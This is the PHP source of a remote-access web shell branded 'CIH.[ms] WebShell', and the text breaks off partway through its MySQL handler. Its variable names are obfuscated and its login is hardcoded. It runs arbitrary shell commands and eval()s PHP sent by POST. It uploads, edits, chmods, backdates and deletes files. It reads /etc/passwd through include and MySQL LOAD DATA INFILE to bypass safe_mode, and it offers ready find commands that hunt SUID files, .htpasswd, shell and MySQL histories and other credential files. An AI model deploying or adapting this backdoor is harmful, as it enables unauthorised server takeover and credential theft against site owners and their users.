<?php
echo '[syslog]01
'; $spc57de2 = 1; $sp32a8cc = 'w0rms'; $sp692362 = 'w0rms'; $sp3cb01b = 0; $spef32e0 = 1; $sp25e48e = 20; $spede532 = array('find suid files' => 'find / -type f -perm -04000 -ls', 'find suid files in current dir' => 'find . -type f -perm -04000 -ls', 'find sgid files' => 'find / -type f -perm -02000 -ls', 'find sgid files in current dir' => 'find . -type f -perm -02000 -ls', 'find config.inc.php files' => 'find / -type f -name config.inc.php', 'find config.inc.php files in current dir' => 'find . -type f -name config.inc.php', 'find config* files' => 'find / -type f -name "config*"', 'find config* files in current dir' => 'find . -type f -name "config*"', 'find all writable files' => 'find / -type f -perm -2 -ls', 'find all writable files in current dir' => 'find . -type f -perm -2 -ls', 'find all writable directories' => 'find /  -type d -perm -2 -ls', 'find all writable directories in current dir' => 'find . -type d -perm -2 -ls', 'find all writable directories and files' => 'find / -perm -2 -ls', 'find all writable directories and files in current dir' => 'find . -perm -2 -ls', 'find all service.pwd files' => 'find / -type f -name service.pwd', 'find service.pwd files in current dir' => 'find . -type f -name service.pwd', 'find all .htpasswd files' => 'find / -type f -name .htpasswd', 'find .htpasswd files in current dir' => 'find . -type f -name .htpasswd', 'find all .bash_history files' => 'find / -type f -name .bash_history', 'find .bash_history files in current dir' => 'find . -type f -name .bash_history', 'find all .mysql_history files' => 'find / -type f -name .mysql_history', 'find .mysql_history files in current dir' => 'find . -type f -name .mysql_history', 'find all .fetchmailrc files' => 'find / -type f -name .fetchmailrc', 'find .fetchmailrc files in current dir' => 'find . -type f -name .fetchmailrc', 'list file attributes on a Linux second extended file system' => 'lsattr -va', 'show opened ports' => 'netstat -an'); $sp1b2b3c = array('SHELL' => 'shell', 'EVAL' => 'eval', 'MySql Suite' => 'mysql', 'Server Information' => 'server', 'Env Informaion' => 'envinfo', 'PHPinfo' => 'phpinfo', 'Shell delete' => 'delete'); $sp7c6a43 = '0.99.1 [ beta {fix} ]'; session_start(); define('start', atime()); if (isset($_POST['eval'])) { error_reporting(E_ALL & ~E_NOTICE); } elseif ($sp3cb01b) { error_reporting(E_ALL & ~E_NOTICE); } else { error_reporting(0); } ini_set('max_execution_time', 0); if (version_compare(phpversion(), '4.1.0') == -1) { $_POST =& $sp61422f; $_GET =& $sp3c2858; $_SERVER =& $sp2da22e; } if (get_magic_quotes_gpc()) { foreach ($_POST as $sp7ac89e => $sp8e17b7) { $_POST[$sp7ac89e] = stripslashes($sp8e17b7); } foreach ($_SERVER as $sp7ac89e => $sp8e17b7) { $_SERVER[$sp7ac89e] = stripslashes($sp8e17b7); } foreach ($_ENV as $sp7ac89e => $sp8e17b7) { $_SERVER[$sp7ac89e] = stripslashes($sp8e17b7); } foreach ($_FILES as $sp7ac89e => $sp8e17b7) { $_SERVER[$sp7ac89e] = stripslashes($sp8e17b7); } } if ($spc57de2 == 0) { $_SESSION['logged'] = true; } $spdda14d = ini_get('safe_mode'); if (!$spdda14d) { $spdda14d = 'off'; } else { $spdda14d = 'On'; } $sp6050b9 = null; $spee51b5 = getcwd(); if (strlen($spee51b5) > 1 && $spee51b5[1] == ':') { $sp6050b9 = 'win'; } else { $sp6050b9 = 'nix'; } if (empty($spee51b5)) { $sp5e690f = getenv('OS'); if (empty($sp5e690f)) { $sp5e690f = php_uname(); } if (empty($sp5e690f)) { $sp5e690f = '-'; $sp6050b9 = 'nix'; } else { if (eregi('^win', $sp5e690f)) { $sp6050b9 = 'win'; } else { $sp6050b9 = 'nix'; } } } echo '[syslog]02
'; function atime() { list($sp7e71ac, $spfff6cb) = explode(' ', microtime()); return (double) $sp7e71ac + (double) $spfff6cb; } function fperms($sp7ff75d) { $spce0b8c = fileperms($sp7ff75d); if (($spce0b8c & 49152) == 49152) { $sp35a580 = 's'; } elseif (($spce0b8c & 40960) == 40960) { $sp35a580 = 'l'; } elseif (($spce0b8c & 32768) == 32768) { $sp35a580 = '-'; } elseif (($spce0b8c & 24576) == 24576) { $sp35a580 = 'b'; } elseif (($spce0b8c & 16384) == 16384) { $sp35a580 = 'd'; } elseif (($spce0b8c & 8192) == 8192) { $sp35a580 = 'c'; } elseif (($spce0b8c & 4096) == 4096) { $sp35a580 = 'p'; } else { $sp35a580 = 'u'; } $sp35a580 .= $spce0b8c & 256 ? 'r' : '-'; $sp35a580 .= $spce0b8c & 128 ? 'w' : '-'; $sp35a580 .= $spce0b8c & 64 ? $spce0b8c & 2048 ? 's' : 'x' : ($spce0b8c & 2048 ? 'S' : '-'); $sp35a580 .= $spce0b8c & 32 ? 'r' : '-'; $sp35a580 .= $spce0b8c & 16 ? 'w' : '-'; $sp35a580 .= $spce0b8c & 8 ? $spce0b8c & 1024 ? 's' : 'x' : ($spce0b8c & 1024 ? 'S' : '-'); $sp35a580 .= $spce0b8c & 4 ? 'r' : '-'; $sp35a580 .= $spce0b8c & 2 ? 'w' : '-'; $sp35a580 .= $spce0b8c & 1 ? $spce0b8c & 512 ? 't' : 'x' : ($spce0b8c & 512 ? 'T' : '-'); return $sp35a580; } function conv_size($spbb5bfd) { if ($spbb5bfd >= 1073741824) { $spbb5bfd = round($spbb5bfd / 1073741824 * 100) / 100 . ' GB'; } elseif ($spbb5bfd >= 1048576) { $spbb5bfd = round($spbb5bfd / 1048576 * 100) / 100 . ' MB'; } elseif ($spbb5bfd >= 1024) { $spbb5bfd = round($spbb5bfd / 1024 * 100) / 100 . ' KB'; } else { $spbb5bfd = $spbb5bfd . ' B'; } return $spbb5bfd; } function fileread($sp9e156d) { $sp4f87f9 = fopen($sp9e156d, 'r'); if (!$sp4f87f9) { error('Could not open file', $sp7c6a43); } while (!feof($sp4f87f9)) { $sp47b792 = fgets($sp4f87f9); echo htmlspecialchars($sp47b792); } } function fileread2($sp9e156d, $spef32e0) { $sp4f87f9 = fopen($sp9e156d, 'r'); if (!$sp4f87f9) { error('Could not open file', $sp7c6a43); } echo '<table style="font-size:10px; width:100%; margin:0px;  background:#222; ">'; if ($spef32e0) { $sp412bbc = 1; while (!feof($sp4f87f9)) { $sp47b792 = fgets($sp4f87f9); echo '<tr style="background:#242424;"><td style="text-align:center;padding:3px; width:2%; border-right:1px solid #2e2e2e; color:#444;">' . $sp412bbc . '</td><td>' . htmlspecialchars($sp47b792) . '</td></tr>'; $sp412bbc++; } } else { while (!feof($sp4f87f9)) { $sp47b792 = fgets($sp4f87f9); echo '<tr style="background:#242424;"><td>' . htmlspecialchars($sp47b792) . '</td></tr>'; } } echo '</table><br/>'; } function safq($sp8cac4d) { $spc82d63 = array(); $sp8e5eb2 = mysql_query($sp8cac4d); if (mysql_num_rows($sp8e5eb2) > 0) { $sp41000b = 0; while ($spa596f1 = mysql_fetch_row($sp8e5eb2)) { foreach ($spa596f1 as $sp412bbc => $sp8e17b7) { $spaf32d2 = mysql_field_name($sp8e5eb2, $sp412bbc); $sp410a9e["{$spaf32d2}"] = $sp8e17b7; $spc82d63[$sp41000b] = $sp410a9e; } $sp41000b++; } } return $spc82d63; } function cmd_exec($sp3f04c8) { if (isset($_POST['cmd'])) { $sp59db13 = $_POST['cmd']; } else { $sp59db13 = $sp3f04c8; } $spb7d120 = ''; if (isset($_POST['cmdir'])) { chdir($_POST['cmdir']); } if (function_exists('system')) { ob_start(); system($sp59db13); $spb7d120 = ob_get_contents(); ob_end_clean(); } elseif (function_exists('exec')) { exec($sp59db13, $spb7d120); $spb7d120 = join('
', $spb7d120); } elseif (function_exists('shell_exec')) { $spb7d120 = shell_exec($sp59db13); } elseif (function_exists('passthru')) { ob_start(); passthru($sp59db13); $spb7d120 = ob_get_contents(); ob_end_clean(); } elseif (is_resource($sp1b2b3c = popen($sp59db13, 'r'))) { $spb7d120 = ''; while (!feof($sp1b2b3c)) { $spb7d120 .= fread($sp1b2b3c, 1024); } pclose($sp1b2b3c); } echo $spb7d120; } function code_eval() { if (isset($_POST['eval'])) { echo '
 result is:<br/><br/>'; eval($_POST['eval']); } } function error($spcc3eaa, $sp7c6a43) { echo '
<div class="notice">
<p align="left" style="padding-left:15px;"><b>error occured:</b></p></div>
<div class="notice" style="margin-bottom:0px; border-bottom:2px solid #222;">
<textarea cols="100" rows="15" style="width:98%;" class="txt"> '; echo $spcc3eaa; echo '</textarea></div>'; do_footer($sp7c6a43); die; } function notice($spcc3eaa) { echo "<div class='notice'>{$spcc3eaa}</div>"; } function do_header($sp1b2b3c, $spc57de2, $sp6050b9, $sp149c6d) { echo '<html><head>'; if (isset($_POST['cmd']) || isset($_POST['alias'])) { echo '<meta http-equiv="Content-Type" content="text/html; charset=cp866">'; } else { echo '<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'; } echo '
<title> CIH.[ms] WebShell </title>
<style>
body{background:#333; color:#999;font-family:Verdana, Arial;font-size:10px; padding:0px; margin:0px;}
.logo {color:#999; font-family:Verdana, Arial; font-size:23px; text-align:left; padding-left:5px; padding-top:0px;  margin-bottom:2px;}
.m {color:#888;font-family:Verdana, Arial;font-size:10px;  text-align:right; width:80px;background:#2c2c2c; border: 0px; border-right:1px solid #444; cursor:pointer; cursor:hand;}
.m2 {background:#2c2c2c;color:#999;font-size:10px;font-family:Verdana;border: 0px; padding:3px; width:100%; cursor:pointer; cursor:hand;}
.m2:hover {color:#ccc; background:#292929;}
.i {color:#555;font-family:Verdana, Arial;font-size:10px;  text-align:right;}
.notice {background:#252525; padding:4px; margin-bottom:2px;}
.footer {font-family:Verdana;font-size:10px;  background:#252525; color:#555; padding:4px; border-bottom:1px solid #222; border-left:1px solid #444; border-right:1px solid #444; text-align:center;}
.txt {background:#222; border:1px solid #333; color:#999; font-family:Verdana, Arial;font-size:10px; padding:5px;}
.butt1 {height:20px; width:20px; padding:2px;border:1px solid #222;background:#333; color:#999; font-family:Verdana, Arial;font-size:10px;}
.filet {color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center;}
.ico {color:#555;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center;}
.dir { cursor:pointer; cursor:hand;background:#252525;color:#999;font-weight:bold;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center; border:0px;}
.file { cursor:pointer; cursor:hand; background:#252525;color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center;border:0px; margin:0px;}
.file:hover, .dir:hover {color:#ccc;}
.str{background:#242424; padding:8px; color:#999; font-size:10px; border-bottom:1px solid #292929; border-top:1px solid #292929; margin-top:15px; text-align:left}
.my{background:#252525;color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:left;border:0px;}
.form {background:#232323; height:22px; border:1px solid #2e2e2e; width:98%; padding:4px; color:#999; font-family:Verdana, Arial;font-size:10px; }
.fm {background:#272727; border:0px; color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px;}
.fa {background:#222; color:#888;font-family:Verdana, Arial; font-size:10px;  text-align:right; border: 0px; width:100%; height:100%; padding:10px; text-align:center;}
.fa1 {background:#222; color:#888;font-family:Verdana, Arial; font-size:10px;  text-align:right; border: 0px; width:100%; height:100%; padding:2px; text-align:center;}
.fa:hover, .fa1:hover {background:#292929; color:#ccc;}
</style>
</head>
<body><div style="position:absolute; left:0px; top:0px; background:#333; text-align:center; padding-left:100px; padding-right:100px; height:90%">
<div style="background:#222; margin:0px; border-left:1px solid #444; border-right:1px solid #444; padding-left:0px; padding-right:0px;">
<table style="width:100%; height:25px;">
   <tr style="background:#2c2c2c;">
    <td style="color:#666; font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:left; padding-left:6px;">
   cihshell on <b>' . $_SERVER['HTTP_HOST'] . '</b>
    </td>'; echo '<form method=\'post\' action=\'\' style=\'padding:0px; margin:0px;\'><input type=\'hidden\' name=\'path\' value=\'' . $sp149c6d . '\' class=\'m2\'><td class=\'m\'><input type=\'submit\'  value=\'main\' class=\'m2\'></td>'; foreach ($sp1b2b3c as $sp8db113 => $sp6d4391) { echo "\n        <!-- {$sp8db113} -->\n        <td class='m'><input type='submit' name='do' value='{$sp6d4391}' class='m2'></td>\n       "; } if ($spc57de2) { echo '<td class=\'m\'><input type=\'submit\' name=\'do\' value=\'logout\' class=\'m2\'></td>'; } $spdc2673 = ini_get('disable_functions'); $spdda14d = ini_get('safe_mode'); if (!$spdda14d) { $spdda14d = 'Off'; } else { $spdda14d = 'On'; } $sp8293a4 = function_exists('mysql_connect'); if ($sp8293a4) { $sp94ef74 = 'On'; } else { $sp94ef74 = 'Off'; } $sp5cb761 = function_exists('pg_connect'); if ($sp5cb761) { $sp82988e = 'On'; } else { $sp82988e = 'Off'; } $spca5898 = function_exists('mssql_connect'); if ($spca5898) { $spf172be = 'On'; } else { $spf172be = 'Off'; } $sp6680e6 = function_exists('ocilogon'); if ($sp6680e6) { $sp738a11 = 'On'; } else { $sp738a11 = 'Off'; } $sp8c7da9 = function_exists('curl_version'); if ($sp8c7da9) { $spe51311 = 'On'; } else { $spe51311 = 'Off'; } $spce0b8c = fperms($sp149c6d); echo ' </tr>
</table>

<table style="width:100%; margin-top:5px;"><tr>
<td class="logo" style="width:120px;">CIH.<span style="color:#555">[</span><span style="color:#888">ms</span><span style="color:#555">]</span></td>
<td class="i" style="padding-right:5px; text-align:right;">
<nobr><b style="color:#666"><i>' . $spce0b8c . '</i></b>  <span style="color:#333">|</span></nobr>
<nobr>OS: <b>' . php_uname() . '</b>  <span style="color:#333">|</span></nobr>
<nobr>safe mode: <b>' . $spdda14d . '</b>  <span style="color:#333">|</span></nobr>
<nobr>cURL: <b>' . $spe51311 . '</b>  <span style="color:#333">|</span></nobr>
<nobr>MySQL: <b>' . $sp94ef74 . '</b>  <span style="color:#333">|</span></nobr>
<nobr>MSSQL: <b>' . $spf172be . '</b> <span style="color:#333">|</span></nobr>
<nobr>PostgreSQL: <b>' . $sp82988e . '</b> <span style="color:#333">|</span></nobr>
<nobr>Oracle: <b>' . $sp738a11 . '</b> <span style="color:#333">|</span></nobr>
PHP:  <b>' . phpversion() . '</b>
</td>

</tr></table>
<div style="border-bottom:1px solid #232323; margin-bottom:2px; font-size:5px;">&nbsp;</div>'; if (!empty($spdc2673)) { echo '<div style="border-bottom:1px solid #232323; margin-bottom:2px; font-size:10px; color:#666; text-align:right; padding:5px;"><b>disabled functions:&nbsp;</b>' . $spdc2673 . '</div>'; } } function do_footer($sp7c6a43) { echo '</div>
<div class="footer">
<span style="float:right; color:#333;">' . round(atime() - start, 5) . '</span>
<b><form method="post" style="margin:0px;">&copy;</b><input type="submit" value="cihshell" name="do"
style="border:0px; background:#252525; font-weight:bold;  padding:0px;" class="footer"/>&nbsp;&nbsp;version : ' . $sp7c6a43 . '</form>
</div></div></body></html>'; } if (!empty($_POST['login']) && !empty($_POST['password'])) { if ($_POST['login'] == $sp32a8cc && $_POST['password'] == $sp692362) { $_SESSION['logged'] = true; } else { echo '
<html><head><style>body{background:#333;}</style><title>login </title></head>
<body><table style="margin-left:100px; margin-top:100px; background:#222; font-family:Verdana; font-size:10px; color:#999; padding:4px; width:100%:">
<tr>
<td><form method="post" style="margin:0px; padding:)px;">
login: <input type="text" name="login" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;
password: <input type="text" name="password" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;
<input type="submit"  style="color:#999; border:0px; font-size:10px; background:#262626; height:20px;; font-family:Verdana;" value="go"></form></td></tr><tr><td style="text-align:center; color:#666;">incorrect login or password</td></tr></table></body></html>'; die; } } if (isset($_POST['do']) && $_POST['do'] == 'logout') { unset($_SESSION['logged']); } if ($_SESSION['logged'] == true) { if (isset($_POST['do']) && $_POST['do'] == 'phpinfo') { echo '<form method="post"><input type="submit" value="return back" style="width:100%;"></form>'; phpinfo(); echo '<form method="post"><input type="submit" value="return back" style="width:100%;"></form>'; die; } if (isset($_POST['fdo']) && isset($_POST['ffile'])) { $sp7132ba = $_POST['ffile']; switch ($_POST['fdo']) { case 'download': $sp034fe8 = $_POST['filename']; header('Content-type: application/x-octet-stream'); header('Content-disposition: attachment; filename=' . $sp034fe8 . ';'); readfile($sp7132ba); die; break; case 'preview': include $_POST['ffile']; die; break; } } if (isset($_POST['f_file'])) { if ($_POST['f_file'] == '..') { $sp2a693b = strpos($_POST['f_path'], strrchr($_POST['f_path'], '/')); $sp149c6d = substr($_POST['f_path'], 0, $sp2a693b); } else { $sp149c6d = $_POST['f_path'] . '/' . $_POST['f_file']; } } elseif (isset($_POST['path'])) { $sp149c6d = $_POST['path']; } else { $sp149c6d = $spd26233; } if (isset($_POST['restore'])) { $sp149c6d = $spd26233; } $sp149c6d = str_replace('\\', '/', $sp149c6d); $sp149c6d = str_replace('\'', '', $sp149c6d); do_header($sp1b2b3c, $spc57de2, $sp6050b9, $sp149c6d); echo '<table class="notice" style="width:100%; margin-bottom:7px; background:#272727"><tr>
<form method="post" action="" style="padding:0px; margin:0px;">
<td style="width:50px;">
<input type="hidden" value="' . $sp149c6d . '" name="f_path">
<input type="submit" value=".." name="f_file" class="butt1">
<input type="submit" value="."  name="restore" class="butt1"></td>
<td></form>
<form method="post" action="" style="padding:0px; margin:0px;">
<input type="text" size="78"  value="' . $sp149c6d . '" name="path" style=" width:90%; height:20px; padding:3px;border:1px solid #222;background:#2c2c2c; color:#999; font-family:Verdana, Arial;font-size:10px;" >
<input type="submit" value="go" class="butt1" style="width:30px; height:21px;">
</form></td>
</tr></table>'; if (isset($_POST['safe_mode'])) { echo '
<table style=\'width:100%; font-size:10px;\'>
<tr style=\'background:#272727;\' ><td  style=\'padding:10px; border-top:1px solid #2e2e2e;\'><b>Try to read file(include):</b></td></tr>
<tr style=\'background:#242424;\' ><td style=\'padding:10px;\'><form action=\'\' method=\'post\' style=\'padding:0px; margin:0px;\'>
<input type=\'text\' name=\'sm_inc\' style=\'width:80%;\' class=\'form\' value=\'/etc/passwd\'/>
<input class=\'form\' style=\'width:60px;\'  type=\'submit\' value=\'try\'></form></td></tr>
<tr style=\'background:#252525;\'><td  style=\'border-bottom:1px solid #2e2e2e;\'>&nbsp;</td></tr>
<tr style=\'background:#222; font-size:1px;\'><td>&nbsp;</td></tr>

<tr style=\'background:#272727;\' ><td  style=\'padding:10px; border-top:1px solid #2e2e2e;\'><b>Try to read file(include):</b></td></tr>
<tr style=\'background:#242424;\' >
<td style=\'padding:10px;\'>
<form action=\'\' method=\'post\' style=\'padding:0px; margin:0px;\'>
<input type=\'text\' name=\'mysql_host\' style=\'width:15%;\' class=\'form\' value=\'localhost\'/>
<span style=\'margin-left:5px; margin-right:5px;\'>:</span><input type=\'text\' name=\'mysql_port\' style=\'width:40px\' class=\'form\' value=\'3306\'/>
<span style=\'margin-left:5px; margin-right:5px;\'>database:</span><input type=\'text\' name=\'mysql_db\' style=\'width:15%;\' class=\'form\' value=\'dbname\'/>
<span style=\'margin-left:5px; margin-right:5px;\'>login:</span><input type=\'text\' name=\'mysql_login\' style=\'width:15%;\' class=\'form\' value=\'dblogin\'/>
<span style=\'margin-left:5px; margin-right:5px;\'>password:</span><input type=\'text\' name=\'mysql_passw\' style=\'width:15%;\' class=\'form\' value=\'dbpassword\'/>
<input type=\'text\' name=\'mysql_file\' style=\'margin-top:3px;width:700px;\' class=\'form\' value=\'/etc/passwd\'/><br/>
<input type=\'submit\' name=\'sm_mysql\' value=\'try\' class=\'form\' style=\'margin-top:8px;width:50px;\'>
</form></td></tr>
<tr style=\'background:#252525;\'><td  style=\'border-bottom:1px solid #2e2e2e;\'>&nbsp;</td></tr>
<tr style=\'background:#222; font-size:1px;\'><td>&nbsp;</td></tr>
</table>
'; do_footer($sp7c6a43); die; } if (isset($_POST['sm_inc'])) { echo '<textarea cols=\'170\' rows=\'34\' class=\'txt\' style=\'width:98%;\' > '; include $_POST['sm_inc']; echo '</textarea><br/><input type=\'button\' class=\'form\' value=\'go back\'   onClick=\'javascript:history.back();\'><br/><br/>'; do_footer($spd46064); die; } if (isset($_POST['sm_mysql'])) { echo '<textarea cols=\'170\' rows=\'34\' class=\'txt\' style=\'width:98%;\' > '; if (!isset($_POST['mysql_port']) || empty($_POST['mysql_port'])) { $_POST['mysql_port'] = '3306'; } $sp95ae53 = mysql_connect($_POST['mysql_host'] . ':' . $_POST['mysql_port'], $_POST['mysql_login'], $_POST['mysql_passw']); if ($sp95ae53) { if (mysql_select_db($_POST['mysql_db'], $sp95ae53)) { $sp2f57d0 = 'DROP TABLE IF EXISTS cih_tb;'; mysql_query($sp2f57d0); $sp2f57d0 = 'CREATE TABLE `cih_tb` ( `file` LONGBLOB NOT NULL );'; mysql_query($sp2f57d0); $sp2f57d0 = 'LOAD DATA INFILE "' . $_POST['mysql_file'] . '" INTO TABLE cih_tb;'; mysql_query($sp2f57d0); $sp2f57d0 = 'SELECT * FROM cih_tb;'; $sp305b9c = mysql_query($sp2f57d0); while ($sp73ff2d = mysql_fetch_array($sp305b9c)) { echo htmlspecialchars($sp73ff2d[0]); } $sp2f57d0 = 'DROP TABLE IF EXISTS cih_tb;'; mysql_query($sp2f57d0); } else { echo 'Can\\\'t select database'; } mysql_close($sp95ae53); } else { echo '-- Could not connect to MySQL server'; } echo '</textarea><br/><input type=\'button\' class=\'form\' value=\'go back\'   onClick=\'javascript:history.back();\'><br/><br/>'; do_footer($spd46064); die; } if ($spdda14d == 'On' && !isset($_POST['safe_mode'])) { notice('<form method="post" style="margin:0px;"><b>safe_mode</b> is <b>On.</b><input type="submit" name="safe_mode" value="Click on this message to start working" style="font-size:10px; color:#999; font-family:Verdana;border:0px; background:#252525;"/></form>'); } if (isset($_POST['fileact'])) { switch ($_POST['fileact']) { case 'New File': $sp651f5c = $_POST['curdir']; echo '<form method=\'post\' action=\'\' style=\'margin:0px; padding:0px;\'><textarea cols=\'170\' rows=\'34\' class=\'txt\' style=\'width:98%;\' name=\'wrcont\'></textarea>

<input type=\'hidden\' name=\'path\' value=\'' . $_POST['curdir'] . '\'><input type=\'hidden\' name=\'curdir\' value=\'' . $_POST['curdir'] . '\'>
<input type=\'text\' name=\'nfname\' class=\'form\' style=\'width:28%; background:#252525;margin-bottom:1px; margin-right:1px;\' value=\'file.txt\'><input type=\'submit\' name=\'wrfile\' class=\'form\' value=\'create file\' style=\'width:70%\'></form><br/>'; do_footer($sp7c6a43); die; break; case 'New Dir': $sp7f894a = $_POST['curdir']; echo "<form method='post' action='' style='margin:0px;'><input type='hidden' name='curdir' value='{$sp7f894a}'><input type='hidden' name='path' value='{$sp7f894a}'><input type='text' name='dirname' class='form'  style='width:90%; margin-right:1px;' size='100'><input type='submit' style='width:60px;' class='form' value='go!'></form><br/>"; do_footer($sp7c6a43); die; break; case 'Upload': if (isset($_FILES['userfile'])) { $sp7ff75d = $_FILES['userfile']; $sp7f894a = $_POST['path']; if (isset($_POST['newfilech']) && !empty($_POST['newfile'])) { $sp2fa1b5 = $_POST['newfile']; } else { $sp2fa1b5 = $sp7ff75d['name']; } if ($sp7ff75d['error'] != 0) { error($sp7ff75d['error']); } else { copy($sp7ff75d['tmp_name'], $sp7f894a . '/' . $sp2fa1b5); if (!file_exists($sp7f894a . '/' . $sp7ff75d['name'])) { error('Upload failed. (Can\'t copy temp file ' . $sp7ff75d['tmp_name'] . ' into current directory)', $sp7c6a43); } else { notice('File ' . $sp2fa1b5 . ' was uploaded successfuly..</div>'); } } } echo "<table style='width:100%; font-size:10px;'><tr style='background:#272727;' ><td  style='padding:10px; border-top:1px solid #2e2e2e;'><b>Upload from your computer:</b></td></tr>\n<tr style='background:#242424;' ><td style='padding:10px;'><form action='' enctype='multipart/form-data' method='post' style='padding:0px; margin:0px;'><input type='hidden' name='path' value='{$sp149c6d}'> <input type='hidden' name='fileact' value='Upload'><input name='userfile' size='85' value='' class='form' type='file' style='border:1px solid #444;'><br/><br/>New name :<input name='newfilech'  value='1' type='checkbox'><input type='text' name='newfile' style='width:20%;' class='form' value='filename.php'/><input type='submit' style='width:60px;' class='form' value='go!'></form></td></tr>\n<tr style='background:#252525;'><td  style='border-bottom:1px solid #2e2e2e;'>&nbsp;</td></tr>\n<tr style='background:#222; font-size:1px;'><td>&nbsp;</td></tr></table>"; do_footer($sp7c6a43); die; break; } } if (isset($_POST['newname'])) { rename($_POST['ffile'], $_POST['newname']); if (!file_exists($_POST['newname'])) { error('Could not rename '); } notice('File was successfuly renamed to &nbsp;' . $_POST['newname'] . '...'); } if (isset($_POST['newpath'])) { copy($_POST['ffile'], $_POST['newpath']); if (!file_exists($_POST['newpath'])) { error('Could not copy file'); } echo ' <div class=\'notice\'>File was successfuly copied to &nbsp;<b>' . $_POST['newpath'] . '</b>...</div>'; } if (isset($_POST['chmod'])) { $spd09f64 = chmod($_POST['ffile'], $_POST['chmod']); if (!$spd09f64) { error('Could not change permissions :o(', $sp7c6a43); } echo ' <div class=\'notice\'>We hope that permissions for file were successfuly  changed to &nbsp;<b>' . $_POST['chmod'] . '</b>&nbsp;^^</div>'; } if (isset($_POST['touch'])) { $spa46af5 = strtotime($_POST['touch']); if (!touch($_POST['ffile'], $spa46af5)) { error('Could not change touch time...', $sp7c6a43); } echo ' <div class=\'notice\'>We hope that touch for file were successfuly  changed to &nbsp;<b>' . $_POST['touch'] . '</b>&nbsp;^^</div>'; } if (isset($_POST['ffile']) && isset($_POST['wrcont'])) { $spbcde15 = $_POST['ffile']; $spc60c53 = $_POST['wrcont']; $sp4f87f9 = fopen($spbcde15, 'w'); if ($sp4f87f9) { fwrite($sp4f87f9, $spc60c53); fclose($sp4f87f9); } else { error('Couldn\'t write to file..'); } echo "<div class='notice'>File&nbsp;<b>{$spbcde15}</b> &nbsp; was successfuly modified</div>"; } if (isset($_POST['nfname']) && isset($_POST['curdir']) && isset($_POST['wrcont'])) { $spfc2aa9 = $_POST['curdir'] . '/' . $_POST['nfname']; $sp4f87f9 = fopen($spfc2aa9, 'w'); $sp305b9c = fwrite($sp4f87f9, $_POST['wrcont']); fclose($sp4f87f9); if (!file_exists($spfc2aa9)) { error('Could not create a file..'); } else { notice('File was successfuly created'); } } if (isset($_POST['dirname']) && isset($_POST['curdir'])) { $sp7f894a = $_POST['curdir']; mkdir($sp7f894a . '/' . $_POST['dirname']); if (file_exists($sp7f894a . '/' . $_POST['dirname'])) { notice($sp7f894a . '/' . $_POST['dirname'] . '&nbsp;was successfuly created.'); } else { error('An error occured while creating dir', $sp7c6a43); } } if (isset($_POST['ddo']) && isset($_POST['dirr'])) { switch ($_POST['ddo']) { case 'rename': echo ' <form method=\'post\' action=\'\' style=\'margin:0px;\'><input type=\'hidden\' name=\'path\' value=\'' . $spd26233 . '\'><input type=\'text\' name=\'ffile\' class=\'form\'  value=\'' . $_POST['dirr'] . '\' style=\'width:40%\'><span style=\'margin-left:4px; margin-right:4px;\'>to</span><input type=\'text\' name=\'newname\' class=\'form\'  value=\'' . $_POST['dirr'] . '\'  style=\'width:40%\'><input type=\'submit\' style=\'width:60px;\' class=\'form\' value=\'rename!\'></form><br/>'; do_footer($sp7c6a43); die; break; case 'delete': rmdir($_POST['dirr']); if (file_exists($_POST['dirr'])) { error('Could not delete directory'); } notice($_POST['dirr'] . '&nbsp;was successfuly deleted.'); do_footer($spd46064); break; } } if (isset($_POST['fdo']) && isset($_POST['ffile']) && $_POST['fdo'] == 'delete') { unlink($_POST['ffile']); if (file_exists($_POST['ffile'])) { error('Could not delete file'); } notice('<b>' . $_POST['ffile'] . '</b>&nbsp;was successfuly deleted.'); } if (isset($_POST['diract'])) { $sp149c6d = $_POST['cmdir']; $spce0b8c = fperms($_POST['cmdir']); echo "\n<div  style='padding:2px;'><div style='background:#272727; padding:3px; margin-bottom:3px;text-align:left;'><b>File actions</b></div><div style='background:#272727; padding:3px;  font-size:9px; text-align:left;'>dir:{$sp149c6d}&nbsp;&nbsp;|&nbsp;&nbsp; permissions: <b>{$spce0b8c} </b>&nbsp;&nbsp;</div><div style='padding:4px; padding-left:30px; font-size:9px; font-weight:bold; color:#999; text-align:left;'><form method='post' action=''><input type='hidden' name='dirr' value='{$sp149c6d}'><input type='hidden' name='path' value='{$sp149c6d}'><input type='hidden' name='curpath' value='{$spb4c55b}'><input type='hidden' name='filename' value='{$sp90a119}'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;><input type='submit' class='m' name='ddo' value='rename' style='margin-bottom:0px; background:#222;'><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;><input type='submit' class='m' name='ddo' value='delete' style='margin-bottom:0px; background:#222;'><br/><br/><br/></form></div><div style='background:#272727; font-size:9px;'>&nbsp;</div></div>"; do_footer($sp7c6a43); die; } echo '[syslog]04
'; if (isset($_REQUEST['do'])) { switch ($_REQUEST['do']) { case 'mysql': if (isset($_POST['mysqlw_host'])) { $sp342aef = $_POST['mysqlw_host']; } else { $sp342aef = 'localhost'; } if (isset($_POST['mysqlw_db'])) { $sp50c961 = $_POST['mysqlw_db']; } else { $sp50c961 = 'dbname'; } if (isset($_POST['mysqlw_login'])) { $spbfb18a = $_POST['mysqlw_login']; } else { $spbfb18a = 'dblogin'; } if (isset($_POST['mysqlw_passw'])) { $spc9e959 = $_POST['mysqlw_passw']; } else { $spc9e959 = 'dbpassword'; } if (isset($_POST['mysqlw_port'])) { $spb97ae1 = $_POST['mysqlw_port']; } else { $spb97ae1 = '3306'; } if (!empty($_POST['sql'])) { echo '<div >'; $sp0eed39 = $_POST['sql']; $sp95ae53 = mysql_connect($sp342aef . ':' . $spb97ae1, $spbfb18a, $spc9e959); if ($sp95ae53) { if (!empty($_POST['mysqlw_db'])) { mysql_select_db($_POST['mysqlw_db'], $sp95ae53); } $spcfa170 = explode(';', $sp0eed39); foreach ($spcfa170 as $spc71a09 => $sp8cac4d) { $spc71a09++; $sp305b9c = safq($sp8cac4d); $spd7253e = 